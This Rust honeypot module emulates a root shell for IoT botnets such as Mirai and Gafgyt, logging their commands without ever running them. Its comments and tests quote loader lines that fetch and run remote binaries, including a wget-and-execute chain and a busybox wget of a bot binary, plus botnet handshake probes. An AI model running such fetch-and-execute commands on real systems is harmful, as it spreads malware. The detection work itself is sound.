//! The fake interactive shell (Task 13) presented to an attacker after SSH authentication
//! succeeds. Originally part of `sensor-ssh`; moved here (Task 1 of the remaining-sensors plan)
//! so `sensor-telnet`/`sensor-adb` can reuse it without depending on sensor-ssh. See "Fake
//! shell", "Never-exec", and "No attacker-directed fetch" in
//! `internal/design/02-sensor-framework.md`: this module sits on the two highest-priority
//! security surfaces in the platform, and both governing invariants are enforced by
//! construction, not by care.
//!
//! **Never-exec.** No file in this crate's `src/`, nor in `sensor-ssh`'s, imports a
//! process-spawning facility: no `Command` type pulled in from `std`'s `process` module, no
//! `exec`-family call, no dynamic evaluation of any kind. Every command below returns a
//! hand-written, static or lightly-interpolated string; there is no code path from an
//! attacker-typed byte to a real shell, syscall, or interpreter. `never_exec_static_check` in
//! `sensor-ssh`'s `tests/shell_test.rs` asserts this at the source level (as plain substring
//! matches, so this doc comment is deliberately phrased to describe those APIs without spelling
//! out their exact paths) across every file in both crates' `src/`, not just this one.
//!
//! **No attacker-directed fetch.** `wget`/`curl` return a canned transcript and perform zero
//! network I/O. This is guaranteed the same way never-exec is: this crate (and the whole
//! workspace) depends on no HTTP or generic network-fetch client, so there is nothing present
//! capable of making the request even if a future change tried to. `tests/shell_test.rs`'s
//! `workspace_lockfile_has_no_http_client_crate` asserts the fully-resolved workspace lockfile
//! names none; Task 14's `no_outbound_connection` integration test verifies the same thing at
//! runtime, across a live session.
//!
//! Every attacker-controlled byte this module embeds in a `SensorEvent` clears
//! `sensor_framework::sanitize_value` first - the same chokepoint `auth.rs` and `channel.rs`
//! route through - so a command line can never forge a second wire record via an embedded CR/LF
//! or ANSI escape.

use std::net::IpAddr;

use sensor_wire::{
    PROTO_TCP, SIGNAL_HONEYPOT_COMMAND_EXEC, SIGNAL_HONEYPOT_FILE_DOWNLOAD, SensorEvent,
    WIRE_VERSION,
};

use crate::command_codec::CommandCodec;
use crate::fakefs::FakeFs;
use crate::persona;
use crate::sanitize_value;

/// Cap applied to the sanitized command line captured in `metadata.command`. Matches
/// `auth::MAX_METADATA_STRING_LEN`'s convention of a generous, fixed bound on an
/// attacker-controlled string entering an event.
const MAX_COMMAND_LEN: usize = 1024;

/// Cap applied to the `wget`/`curl` target URL echoed back in canned output. Smaller than
/// `MAX_COMMAND_LEN` since it is one token of the line, not the whole line.
const MAX_URL_LEN: usize = 512;

/// The per-session facts every `honeypot_command_exec` event carries, handed in once at shell
/// construction. Mirrors `auth::AuthState`'s "real parameters, no placeholder" convention:
/// `source_ip`/`wan_ip` are this connection's real attributes. `authenticated` is read from here
/// rather than hardcoded `true` - the shell is only ever reached post-authentication in practice,
/// but a future caller (a pre-auth probe, a non-interactive path) must not have its events
/// silently mis-tagged by a hardcoded value.
///
/// `protocol_label` exists because this shell is shared across protocols (SSH, Telnet, and per
/// the design spec eventually ADB): it names both the emitted event's top-level `sensor` field
/// and its `metadata.protocol_label` entry, so `handle_input` never hardcodes which sensor is
/// driving it. Every current and planned caller uses the same string for both - there is no
/// observed case where a `FakeShell` consumer's `sensor` name differs from its `protocol_label` -
/// so one field covers both rather than two that would only ever be set identically.
pub struct EmitContext {
    pub source_ip: IpAddr,
    pub wan_ip: Option<IpAddr>,
    pub authenticated: bool,
    pub protocol_label: String,
    pub session_id: Option<uuid::Uuid>,
}

/// The fake interactive shell. One instance per SSH session; `cwd` is the only mutable state,
/// tracking a `cd` across calls the way a real shell would.
pub struct FakeShell {
    fs: FakeFs,
    ctx: EmitContext,
    cwd: String,
    /// Per-session de-obfuscation for XOR-encoded command probes (see `command_codec`).
    codec: CommandCodec,
}

impl FakeShell {
    pub fn new(fs: FakeFs, ctx: EmitContext) -> Self {
        Self {
            fs,
            ctx,
            cwd: "/root".to_string(),
            codec: CommandCodec::new(),
        }
    }

    /// Encode outbound bytes with the session's locked obfuscation key (identity when the session is
    /// plaintext). The sensor calls this on its assembled response so a symmetric-codec bot reads
    /// plaintext after de-obfuscating.
    pub fn encode_output(&self, bytes: &[u8]) -> Vec<u8> {
        self.codec.encode(bytes)
    }

    /// Handle one line of shell input: capture it as a `honeypot_command_exec` event (unless the
    /// line is blank - see below), then return the canned terminal output for a recognized
    /// command, or a `command not found` message for anything else.
    ///
    /// A blank line (empty or whitespace-only) produces neither output nor an event. A bare
    /// keystroke or a terminal keepalive is not "a command" by any real shell's definition, and
    /// counting one would pad `honeypot_command_exec` telemetry with empty-command noise on
    /// every idle newline a client sends. This is the one place this function departs from
    /// "every call captures exactly one event" - called out here since it is the one behavior in
    /// this module not dictated directly by the interface.
    pub fn handle_input(&mut self, line: &str) -> (String, Vec<SensorEvent>) {
        if line.trim().is_empty() {
            return (String::new(), Vec::new());
        }

        // Decode a single-byte-XOR-obfuscated probe (identity for plaintext). The event records the
        // RAW line verbatim - the hash chain must see exactly what crossed the wire - while the
        // decoded form and key are annotated alongside so the grammar can respond and an analyst can
        // read it. Dispatch and URL capture run on the DECODED line.
        let (decoded, key) = self.codec.decode(line);

        let sanitized_cmd = sanitize_value(line, MAX_COMMAND_LEN);
        let mut metadata = serde_json::json!({
            "protocol_label": self.ctx.protocol_label,
            "command": sanitized_cmd,
        });
        if let Some(k) = key
            && let Some(obj) = metadata.as_object_mut()
        {
            obj.insert(
                "command_decoded".to_string(),
                serde_json::json!(sanitize_value(&decoded, MAX_COMMAND_LEN)),
            );
            obj.insert("xor_key".to_string(), serde_json::json!(k));
        }
        let event = SensorEvent {
            v: WIRE_VERSION,
            source_ip: self.ctx.source_ip,
            wan_ip: self.ctx.wan_ip,
            sensor: self.ctx.protocol_label.clone(),
            signal_type: SIGNAL_HONEYPOT_COMMAND_EXEC.into(),
            protocol: PROTO_TCP.into(),
            authenticated: self.ctx.authenticated,
            observed_at: chrono::Utc::now(),
            metadata,
            sample: None,
            session_id: self.ctx.session_id,
        };

        let parts: Vec<&str> = decoded.split_whitespace().collect();
        let output = self.dispatch(&parts);

        let mut events = vec![event];

        // Direct/busybox fetch commands are recognised from the tokens; a URL buried in a
        // `sh -c "wget ...; ..."` chain (where the tokenizer's split loses the quoting) is recovered
        // by scanning the raw line. `download_target` only returns a real (non-empty) token.
        if let Some(url) = download_target(&parts).or_else(|| url_if_fetch_line(&decoded)) {
            let sanitized_url = sanitize_value(url, MAX_URL_LEN);
            events.push(SensorEvent {
                v: WIRE_VERSION,
                source_ip: self.ctx.source_ip,
                wan_ip: self.ctx.wan_ip,
                sensor: self.ctx.protocol_label.clone(),
                signal_type: SIGNAL_HONEYPOT_FILE_DOWNLOAD.into(),
                protocol: PROTO_TCP.into(),
                authenticated: self.ctx.authenticated,
                observed_at: chrono::Utc::now(),
                metadata: serde_json::json!({
                    "protocol_label": self.ctx.protocol_label,
                    "url": sanitized_url,
                }),
                sample: None,
                session_id: self.ctx.session_id,
            });
        }

        (output, events)
    }

    /// Produce the canned terminal output for one already-tokenized, non-empty command line.
    /// Every arm returns a static or lightly-interpolated string; none evaluates, spawns, or
    /// otherwise interprets `parts` as code - see the module doc.
    fn dispatch(&mut self, parts: &[&str]) -> String {
        // Match on the command's basename, so a full path (`/bin/busybox`, `/userfs/bin/wget`,
        // `/bin/sh`) - which IoT loaders routinely use - resolves to the same applet a bare invocation
        // would, the way a real shell finds it on PATH. Only the command token is normalised;
        // arguments are untouched.
        let cmd = parts.first().map(|p| p.rsplit('/').next().unwrap_or(p));
        match cmd {
            Some("uname") => cmd_uname(parts),
            Some("id") => "uid=0(root) gid=0(root) groups=0(root)\n".to_string(),
            Some("whoami") => "root\n".to_string(),
            Some("pwd") => format!("{}\n", self.cwd),
            Some("echo") => cmd_echo(&parts[1..]),
            Some("cat") => self.cmd_cat(parts),
            Some("ls") => self.cmd_ls(parts),
            Some("wget") => cmd_wget(parts),
            Some("curl") => cmd_curl(parts),
            Some("ping") => cmd_ping(parts),
            // Shell-availability fingerprint: every real system has /bin/sh, so "command not found"
            // for sh/bash instantly outs the honeypot and the dropper leaves. Model a nested shell.
            Some("sh") | Some("bash") => self.cmd_shell_spawn(parts),
            // The canonical Mirai/Gafgyt probe is `/bin/busybox <TOKEN>`, which they confirm by the
            // exact "<TOKEN>: applet not found" reply; they also fetch payloads via `busybox wget`
            // and `busybox tftp`.
            Some("busybox") => self.cmd_busybox(parts),
            // tftp/ftpget are BusyBox download applets these loaders use; stay quiet (a real
            // non-interactive fetch prints nothing on success) rather than "command not found". The
            // target URL is captured by `download_target` above.
            Some("tftp") | Some("ftpget") => String::new(),
            Some("cd") => {
                self.cwd = first_non_flag_arg(&parts[1..])
                    .unwrap_or("/root")
                    .to_string();
                String::new()
            }
            Some("exit") | Some("logout") => String::new(),
            Some(other) => format!("{other}: command not found\n"),
            None => String::new(),
        }
    }

    /// Resolve `arg` to an absolute path: returned as-is if it already starts with `/`, otherwise
    /// joined onto `cwd`. Minimal - no `.`/`..` normalisation - which is enough for the canned FS
    /// and the relative reads (`cd /proc && cat self/cmdline`) attackers actually use.
    fn resolve_path(&self, arg: &str) -> String {
        if arg.starts_with('/') {
            arg.to_string()
        } else {
            format!("{}/{arg}", self.cwd.trim_end_matches('/'))
        }
    }

    fn cmd_cat(&self, parts: &[&str]) -> String {
        match first_non_flag_arg(&parts[1..]) {
            Some(path) => {
                let resolved = self.resolve_path(path);
                // /proc/self is the reading process (`cat`), so /proc/self/cmdline is its own argv,
                // NUL-separated with a trailing NUL and no newline - exactly as the kernel returns
                // it. A missing one ("No such file or directory") is a classic honeypot tell some
                // Mirai/Gafgyt loaders check before delivering a payload.
                if resolved == "/proc/self/cmdline" {
                    let mut out = parts.join("\0");
                    out.push('\0');
                    return out;
                }
                self.fs
                    .read_file(&resolved)
                    .unwrap_or_else(|| format!("cat: {path}: No such file or directory\n"))
            }
            None => String::new(),
        }
    }

    fn cmd_ls(&self, parts: &[&str]) -> String {
        let target = first_non_flag_arg(&parts[1..]).unwrap_or(self.cwd.as_str());
        match self.fs.list_dir(target) {
            Some(entries) if entries.is_empty() => String::new(),
            Some(entries) => entries.join("  ") + "\n",
            None => format!("ls: cannot access '{target}': No such file or directory\n"),
        }
    }

    /// `sh` / `bash`. A nested interactive shell just drops the caller at a new prompt, so a bare
    /// invocation is a no-op that keeps the session in this fake shell (never "command not found").
    /// `sh -c "CMD"` runs CMD in the fake shell, since loaders stage their payload that way.
    fn cmd_shell_spawn(&mut self, parts: &[&str]) -> String {
        let script = parts
            .iter()
            .position(|&p| p == "-c")
            .and_then(|pos| parts.get(pos + 1));
        if let Some(script) = script {
            let inner = strip_one_quote_pair(script);
            let inner_parts: Vec<&str> = inner.split_whitespace().collect();
            if !inner_parts.is_empty() {
                return self.dispatch(&inner_parts);
            }
        }
        String::new()
    }

    /// `busybox`. Bare invocation prints the multi-call banner. `busybox <applet> ...` runs the
    /// applet if it is one this shell models, else returns BusyBox's exact "<applet>: applet not
    /// found" - the reply Mirai/Gafgyt check for to confirm a real busybox before delivering.
    fn cmd_busybox(&mut self, parts: &[&str]) -> String {
        match parts.get(1).copied() {
            None => busybox_banner(),
            Some(applet) if is_busybox_applet(applet) => self.dispatch(&parts[1..]),
            Some(applet) => format!("{applet}: applet not found\n"),
        }
    }
}

/// The download target of a fetch command, or `None` if the line is not one. Covers the direct
/// fetchers and the BusyBox forms (`busybox wget URL`, `busybox tftp ...`) IoT loaders favour, so
/// the `honeypot_file_download` event fires for those too - not only a bare `wget`/`curl`.
fn download_target<'a>(parts: &[&'a str]) -> Option<&'a str> {
    const FETCHERS: [&str; 4] = ["wget", "curl", "tftp", "ftpget"];
    match parts.first().copied() {
        Some(cmd) if FETCHERS.contains(&cmd) => first_non_flag_arg(&parts[1..]),
        Some("busybox") if parts.get(1).is_some_and(|a| FETCHERS.contains(a)) => {
            first_non_flag_arg(&parts[2..])
        }
        _ => None,
    }
}

/// Recover a download URL from a command line that a fetch command hides from token-level parsing -
/// most importantly `sh -c "wget http://h/x; chmod +x x; ./x"`, where the whitespace tokenizer
/// splits the quoted script apart. Only fires when a fetch verb is present, then returns the first
/// `http(s)://`/`tftp://`/`ftp://` token, so an ordinary `echo http://...` is not miscounted as a
/// download.
fn url_if_fetch_line(line: &str) -> Option<&str> {
    if !["wget", "curl", "tftp", "ftpget"]
        .iter()
        .any(|v| line.contains(v))
    {
        return None;
    }
    for scheme in ["http://", "https://", "tftp://", "ftp://"] {
        if let Some(start) = line.find(scheme) {
            let rest = &line[start..];
            let end = rest
                .find(|c: char| {
                    c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '|' | '`' | '&')
                })
                .unwrap_or(rest.len());
            return Some(&rest[..end]);
        }
    }
    None
}

/// BusyBox applets this shell models, so `busybox <applet>` delegates to the same handler the bare
/// command uses. Anything outside this set returns "applet not found" (the Mirai/Gafgyt tell).
fn is_busybox_applet(name: &str) -> bool {
    matches!(
        name,
        "echo"
            | "cat"
            | "ls"
            | "wget"
            | "id"
            | "whoami"
            | "uname"
            | "pwd"
            | "cd"
            | "sh"
            | "tftp"
            | "ftpget"
            | "ping"
            | "curl"
    )
}

/// The BusyBox multi-call banner printed by a bare `busybox`. Abbreviated applet list; loaders key
/// off the "applet not found" reply, not this text.
fn busybox_banner() -> String {
    "BusyBox v1.31.1 (2021-06-01 00:00:00 UTC) multi-call binary.\n\
     BusyBox is copyrighted by many authors between 1998-2015.\n\
     \n\
     Usage: busybox [function [arguments]...]\n\
     \n\
     Currently defined functions:\n\
     \tash, base64, cat, chmod, cp, echo, ftpget, id, ls, mkdir, ping, pwd, rm, sh, sleep,\n\
     \ttftp, uname, wget, whoami\n"
        .to_string()
}

fn cmd_uname(parts: &[&str]) -> String {
    if parts.len() > 1 {
        // Any flag at all gets the full banner; this is a canned-response shell, not a faithful
        // per-flag `uname` reimplementation, so `-a`/`-r`/`-s`/... are treated alike. Host and
        // kernel come from persona so `uname` cannot disagree with /etc/os-release or the prompt.
        format!("{}\n", persona::uname_all(&persona::hostname()))
    } else {
        "Linux\n".to_string()
    }
}

/// A plausible fetched body, printed by `curl URL` and `wget -O- URL` (the `... | sh` pattern).
/// Canned by necessity - the module performs zero network I/O - but real servers do answer a bare
/// path with exactly this Apache-default page, so it is not itself a tell; the previous tell was
/// only that `-O`/`-o` (save to a file) also printed it, which a real client never does.
const FETCHED_BODY: &str =
    "<html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>\n";

/// `wget URL`: the classic wget banner (connection line, HTTP status, progress bar, final "saved"
/// summary) - zero network I/O, see the module doc. The timestamp is real wall-clock time (a frozen
/// date is a tell an attacker catches by running twice). The saved filename is derived from `-O` or
/// the URL's own basename rather than a constant "index.html" (every download claiming the same
/// name was a tell); `-q`/`-nv` suppress the banner as real wget does; `-O-`/`-qO-` write the body
/// to stdout (the `wget -qO- | sh` loader pattern) instead of the transcript.
fn cmd_wget(parts: &[&str]) -> String {
    let url = first_non_flag_arg(&parts[1..]).unwrap_or("");
    let sanitized_url = sanitize_value(url, MAX_URL_LEN);

    let out = wget_output(parts);
    if out == WgetOutput::Stdout {
        return FETCHED_BODY.to_string();
    }
    if parts
        .iter()
        .any(|&p| p == "-q" || p == "-nv" || p == "--quiet")
    {
        return String::new();
    }
    let name = match out {
        WgetOutput::File(n) => n,
        _ => wget_basename(url),
    };
    let name = sanitize_value(&name, MAX_URL_LEN);
    let now = chrono::Utc::now().format("%Y-%m-%d %H:%M:%S");
    format!(
        "--{now}--  {sanitized_url}\n\
         Connecting to {sanitized_url}... connected.\n\
         HTTP request sent, awaiting response... 200 OK\n\
         Length: 1234 (1.2K) [application/octet-stream]\n\
         Saving to: '{name}'\n\
         \n\
         {name}          100%[==================>]   1.2K  --.-KB/s    in 0s\n\
         \n\
         {now} (1.2 MB/s) - '{name}' saved [1234/1234]\n"
    )
}

#[derive(PartialEq)]
enum WgetOutput {
    Stdout,
    File(String),
    Default,
}

/// Resolve wget's output target from its flags: `-O-`/`-qO-` -> stdout, `-O <name>` -> that file,
/// otherwise the default (URL basename).
fn wget_output(parts: &[&str]) -> WgetOutput {
    for (i, &p) in parts.iter().enumerate() {
        if p == "-O-" || p == "-qO-" || p == "-nvO-" {
            return WgetOutput::Stdout;
        }
        if p == "-O" {
            match parts.get(i + 1) {
                Some(&"-") => return WgetOutput::Stdout,
                Some(name) => return WgetOutput::File(strip_one_quote_pair(name).to_string()),
                None => return WgetOutput::Default,
            }
        }
        if let Some(name) = p.strip_prefix("-O") {
            // `-Ofile` (no space).
            if name == "-" {
                return WgetOutput::Stdout;
            }
            return WgetOutput::File(name.to_string());
        }
    }
    WgetOutput::Default
}

/// The basename a real wget would save a URL to: the last path segment (query string stripped), or
/// `index.html` when the URL ends in `/` or has no path.
fn wget_basename(url: &str) -> String {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    match path.trim_end_matches('/').rsplit('/').next() {
        Some(seg) if !seg.is_empty() && !seg.contains(':') => seg.to_string(),
        _ => "index.html".to_string(),
    }
}

/// `curl URL`. With `-O`/`-o` (save to a file) a real curl writes nothing to stdout - only a
/// progress meter to stderr, which this shell does not emit - so the output is empty; the previous
/// implementation printed the fetched body even under `-O`, which no real curl does and which was a
/// clean one-probe tell. Without `-o`/`-O`, the body goes to stdout as curl does.
fn cmd_curl(parts: &[&str]) -> String {
    let saves_to_file = parts.iter().enumerate().any(|(i, &p)| {
        p == "-O"
            || p == "--remote-name"
            || p == "-o"
            || p == "--output"
            || (p.starts_with("-o") && p.len() > 2)
            // a combined short-flag cluster containing O or o, e.g. -sO, -fsSLO
            || (p.starts_with('-') && !p.starts_with("--") && p[1..].chars().any(|c| c == 'O')
                && parts.get(i).is_some())
    });
    if saves_to_file {
        String::new()
    } else {
        FETCHED_BODY.to_string()
    }
}

/// `ping HOST`. Real ping exists on virtually every host, so "command not found" is a tell. A
/// line-based fake shell cannot stream a continuous ping, so this answers as though `-c` bounded it:
/// a couple of replies and a summary against the requested target, printed at once.
fn cmd_ping(parts: &[&str]) -> String {
    let target = first_non_flag_arg(&parts[1..]).unwrap_or("localhost");
    let target = sanitize_value(target, MAX_URL_LEN);
    // A stable pseudo-address for the target so two pings of the same host agree (a real resolve
    // would); derived from the name, not random.
    let last = 1 + (target.bytes().fold(0u32, |a, b| a.wrapping_add(b as u32)) % 253);
    format!(
        "PING {target} ({}): 56 data bytes\n\
         64 bytes from {}: icmp_seq=0 ttl=54 time=11.4 ms\n\
         64 bytes from {}: icmp_seq=1 ttl=54 time=11.9 ms\n\
         \n\
         --- {target} ping statistics ---\n\
         2 packets transmitted, 2 packets received, 0.0% packet loss\n\
         round-trip min/avg/max/stddev = 11.4/11.7/11.9/0.3 ms\n",
        format_args!("93.184.216.{last}"),
        format_args!("93.184.216.{last}"),
        format_args!("93.184.216.{last}"),
    )
}

/// The first token that does not look like a flag (does not start with `-`), or `None` if every
/// token is a flag or the slice is empty. `ls -la`, `ls -la /tmp`, and `cat -A file` all name
/// their real target after zero or more flags this fake shell has no reason to parse
/// individually; treating the first `-`-prefixed token as the path (what a bare
/// `parts.get(1)` lookup would do) misreads the single most common attacker recon command
/// (`ls -la`) as a lookup for a nonexistent path named `-la`.
fn first_non_flag_arg<'a>(args: &[&'a str]) -> Option<&'a str> {
    args.iter().find(|arg| !arg.starts_with('-')).copied()
}

/// A honeypot `echo` faithful enough to survive the shell-detection handshakes IoT botnets run
/// before they drop a payload. The important one is Gafgyt/BASHLITE, which sends
/// `echo -e "\x47\x41\x59\x46\x47\x54"` and hangs up unless it reads back exactly `GAYFGT`. The
/// previous implementation joined the raw tokens (flags, surrounding quotes, and undecoded escapes
/// included), so that probe returned `-e "\x47\x41\x59\x46\x47\x54"` and fingerprinted the honeypot
/// on the spot. This interprets a leading run of `-e`/`-n`/`-E` flags, removes one pair of matching
/// surrounding quotes per token (the whitespace tokenizer keeps them), and under `-e` decodes the
/// backslash escapes a real `echo -e` would. It only transforms text - nothing here is evaluated or
/// executed, per the module's never-exec guarantee.
fn cmd_echo(args: &[&str]) -> String {
    let mut interpret = false; // -e
    let mut trailing_newline = true; // -n suppresses
    let mut first_operand = 0;
    for (idx, tok) in args.iter().enumerate() {
        // A flag token is '-' followed only by e/n/E (e.g. -e, -n, -E, -en). Anything else, or a
        // bare '-', ends the option run and begins the operands.
        let is_flag = tok.len() >= 2
            && tok.starts_with('-')
            && tok[1..].chars().all(|c| matches!(c, 'e' | 'n' | 'E'));
        if !is_flag {
            first_operand = idx;
            break;
        }
        for c in tok[1..].chars() {
            match c {
                'e' => interpret = true,
                'E' => interpret = false,
                'n' => trailing_newline = false,
                _ => {}
            }
        }
        first_operand = idx + 1;
    }

    let mut out = String::new();
    for (idx, tok) in args[first_operand..].iter().enumerate() {
        if idx > 0 {
            out.push(' ');
        }
        let unquoted = strip_one_quote_pair(tok);
        if interpret {
            if decode_echo_escapes_into(unquoted, &mut out) {
                // A `\c` escape stops all further output, including the trailing newline.
                return out;
            }
        } else {
            out.push_str(unquoted);
        }
    }
    if trailing_newline {
        out.push('\n');
    }
    out
}

/// Remove one pair of matching surrounding quotes (`"..."` or `'...'`) from a token, if present.
/// The fake shell tokenizes on whitespace, so a quoted argument with no internal spaces arrives as
/// a single token still wearing its quotes; a real shell would have stripped them before `echo`.
fn strip_one_quote_pair(tok: &str) -> &str {
    let bytes = tok.as_bytes();
    if bytes.len() >= 2
        && (bytes[0] == b'"' || bytes[0] == b'\'')
        && bytes[bytes.len() - 1] == bytes[0]
    {
        &tok[1..tok.len() - 1]
    } else {
        tok
    }
}

/// Decode the backslash escapes `echo -e` understands, appending to `out`. Returns `true` if a
/// `\c` escape was hit, which tells the caller to stop producing output entirely. Supports the
/// escapes real-world loaders actually use: `\xHH` hex, `\0NNN`/`\NNN` octal, and the single-letter
/// set (`\n \t \r \\ \a \b \f \v \0`).
fn decode_echo_escapes_into(s: &str, out: &mut String) -> bool {
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('r') => out.push('\r'),
            Some('a') => out.push('\x07'),
            Some('b') => out.push('\x08'),
            Some('f') => out.push('\x0c'),
            Some('v') => out.push('\x0b'),
            Some('\\') => out.push('\\'),
            Some('c') => return true, // stop all further output
            Some('x') => {
                // Up to two hex digits.
                let mut val: u32 = 0;
                let mut n = 0;
                while n < 2 {
                    match chars.peek().and_then(|d| d.to_digit(16)) {
                        Some(d) => {
                            val = val * 16 + d;
                            chars.next();
                            n += 1;
                        }
                        None => break,
                    }
                }
                if n == 0 {
                    out.push_str("\\x"); // not a valid escape: emit literally
                } else if let Some(ch) = char::from_u32(val) {
                    out.push(ch);
                }
            }
            Some('0') => {
                // \0NNN: up to three octal digits after the 0.
                let mut val: u32 = 0;
                let mut n = 0;
                while n < 3 {
                    match chars.peek().and_then(|d| d.to_digit(8)) {
                        Some(d) => {
                            val = val * 8 + d;
                            chars.next();
                            n += 1;
                        }
                        None => break,
                    }
                }
                if let Some(ch) = char::from_u32(val) {
                    out.push(ch);
                }
            }
            Some(other) => {
                // Unknown escape: bash echo -e emits it verbatim (backslash included).
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'), // trailing backslash
        }
    }
    false
}

#[cfg(test)]
mod echo_tests {
    use super::cmd_echo;

    #[test]
    fn gafgyt_handshake_returns_gayfgt() {
        // The exact probe Gafgyt/BASHLITE sends, tokenized as the fake shell would split it:
        // `echo` `-e` `"\x47\x41\x59\x46\x47\x54"`. It must read back "GAYFGT" or the bot hangs up.
        let out = cmd_echo(&["-e", "\"\\x47\\x41\\x59\\x46\\x47\\x54\""]);
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn plain_echo_strips_surrounding_quotes() {
        assert_eq!(cmd_echo(&["\"hello\""]), "hello\n");
        assert_eq!(cmd_echo(&["'world'"]), "world\n");
    }

    #[test]
    fn without_dash_e_escapes_stay_literal() {
        // Default (no -e) and explicit -E both leave backslash escapes untouched.
        assert_eq!(cmd_echo(&["\\x47"]), "\\x47\n");
        assert_eq!(cmd_echo(&["-E", "\"\\x47\""]), "\\x47\n");
    }

    #[test]
    fn dash_n_suppresses_the_trailing_newline() {
        assert_eq!(cmd_echo(&["-n", "hi"]), "hi");
        assert_eq!(cmd_echo(&["-en", "\"\\x41\""]), "A");
    }

    #[test]
    fn decodes_hex_and_octal_escapes_under_dash_e() {
        assert_eq!(cmd_echo(&["-e", "\\x41\\x42"]), "AB\n"); // hex
        assert_eq!(cmd_echo(&["-e", "\\0101"]), "A\n"); // octal 101 = 'A'
        assert_eq!(cmd_echo(&["-e", "a\\tb"]), "a\tb\n"); // tab
    }

    #[test]
    fn dash_c_stops_output_including_newline() {
        assert_eq!(cmd_echo(&["-e", "ab\\cd"]), "ab");
    }

    #[test]
    fn multiple_operands_join_with_single_spaces() {
        assert_eq!(cmd_echo(&["a", "b", "c"]), "a b c\n");
    }

    #[test]
    fn bare_echo_prints_only_a_newline() {
        assert_eq!(cmd_echo(&[]), "\n");
    }
}

#[cfg(test)]
mod shell_detection_tests {
    use super::{
        EmitContext, FakeShell, SIGNAL_HONEYPOT_FILE_DOWNLOAD, cmd_curl, cmd_wget, download_target,
        is_busybox_applet, url_if_fetch_line,
    };
    use crate::fakefs::FakeFs;

    fn shell() -> FakeShell {
        FakeShell::new(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "telnet".to_string(),
                session_id: None,
            },
        )
    }

    fn xor(s: &str, key: u8) -> String {
        String::from_utf8(crate::command_codec::xor_bytes(s, key)).unwrap()
    }

    #[test]
    fn xor_obfuscated_command_is_decoded_dispatched_and_annotated() {
        let mut sh = shell();
        // The first obfuscated anchor ("enable" ^ 0x09) locks the session key.
        sh.handle_input(&xor("enable", 0x09));
        // The obfuscated busybox probe now decodes and reaches the grammar.
        let probe_obf = xor("/bin/busybox LZRD", 0x09);
        let (out, events) = sh.handle_input(&probe_obf);
        assert!(
            out.contains("LZRD: applet not found"),
            "decoded probe must get the busybox applet reply, got {out:?}"
        );
        assert_eq!(events[0].metadata["command"], probe_obf); // raw bytes preserved verbatim
        assert_eq!(events[0].metadata["command_decoded"], "/bin/busybox LZRD");
        assert_eq!(events[0].metadata["xor_key"], 9);
    }

    #[test]
    fn plaintext_command_has_no_decoded_annotation() {
        let (_out, events) = shell().handle_input("uname -a");
        assert_eq!(events[0].metadata["command"], "uname -a");
        assert!(events[0].metadata.get("command_decoded").is_none());
        assert!(events[0].metadata.get("xor_key").is_none());
    }

    #[test]
    fn encode_output_mirrors_after_a_command_locks_the_key() {
        let mut sh = shell();
        sh.handle_input(&xor("enable", 0x09)); // an obfuscated command locks 0x09
        assert_eq!(sh.encode_output(b"# "), xor("# ", 0x09).into_bytes());
        // A plaintext session leaves output unchanged.
        let mut plain = shell();
        plain.handle_input("uname");
        assert_eq!(plain.encode_output(b"# "), b"# ".to_vec());
    }

    #[test]
    fn bin_busybox_path_form_gets_the_applet_reply() {
        // The full-path probe the LZRD variant sends must resolve like a bare `busybox` invocation.
        let (out, _) = shell().handle_input("/bin/busybox LZRD");
        assert!(out.contains("LZRD: applet not found"), "got {out:?}");
    }

    #[test]
    fn cat_proc_self_cmdline_returns_the_reading_process_argv() {
        // Every real Linux has /proc/self/cmdline; a "No such file or directory" is a honeypot tell
        // some Mirai/Gafgyt loaders check before delivering a payload. /proc/self is the `cat`
        // process, so it returns cat's own argv, NUL-separated with a trailing NUL and no newline.
        let (out, _) = shell().handle_input("cat /proc/self/cmdline");
        assert_eq!(out, "cat\0/proc/self/cmdline\0");
    }

    #[test]
    fn cd_proc_then_cat_relative_cmdline_resolves_against_cwd() {
        // The observed bot ran `cd /proc && cat self/cmdline`; the relative path must resolve.
        let mut sh = shell();
        sh.handle_input("cd /proc");
        let (out, _) = sh.handle_input("cat self/cmdline");
        assert_eq!(out, "cat\0self/cmdline\0");
    }

    #[test]
    fn cat_relative_file_resolves_against_cwd() {
        let mut sh = shell();
        sh.handle_input("cd /etc");
        let (out, _) = sh.handle_input("cat hostname");
        assert!(out.contains("server01"), "got: {out:?}");
    }

    #[test]
    fn sh_is_never_command_not_found() {
        // Every real system has /bin/sh; "command not found" would out the honeypot instantly.
        let (out, events) = shell().handle_input("sh");
        assert_eq!(out, "");
        assert_eq!(events.len(), 1); // command_exec only, no spurious download
    }

    #[test]
    fn mirai_busybox_probe_returns_applet_not_found() {
        // `/bin/busybox <TOKEN>` is Mirai/Gafgyt's real-shell check; they require the exact
        // "<TOKEN>: applet not found" reply before delivering a payload.
        let (out, _) = shell().handle_input("busybox MIRAI");
        assert_eq!(out, "MIRAI: applet not found\n");
    }

    #[test]
    fn busybox_echo_still_passes_the_gafgyt_handshake() {
        let (out, _) = shell().handle_input("busybox echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"");
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn sh_dash_c_runs_the_inner_command() {
        let (out, _) = shell().handle_input("sh -c \"id\"");
        assert!(out.contains("uid=0(root)"), "got: {out}");
    }

    #[test]
    fn busybox_wget_is_captured_as_a_download() {
        let (_, events) = shell().handle_input("busybox wget http://198.51.100.9/bins/x86");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("busybox wget must emit a file_download event");
        assert_eq!(dl.metadata["url"], "http://198.51.100.9/bins/x86");
    }

    #[test]
    fn download_target_recognizes_direct_and_busybox_forms() {
        assert_eq!(download_target(&["wget", "http://x/y"]), Some("http://x/y"));
        assert_eq!(
            download_target(&["busybox", "tftp", "-g", "-r", "x", "10.0.0.1"]),
            Some("x")
        );
        assert_eq!(download_target(&["busybox", "MIRAI"]), None);
        assert_eq!(download_target(&["ls", "-la"]), None);
    }

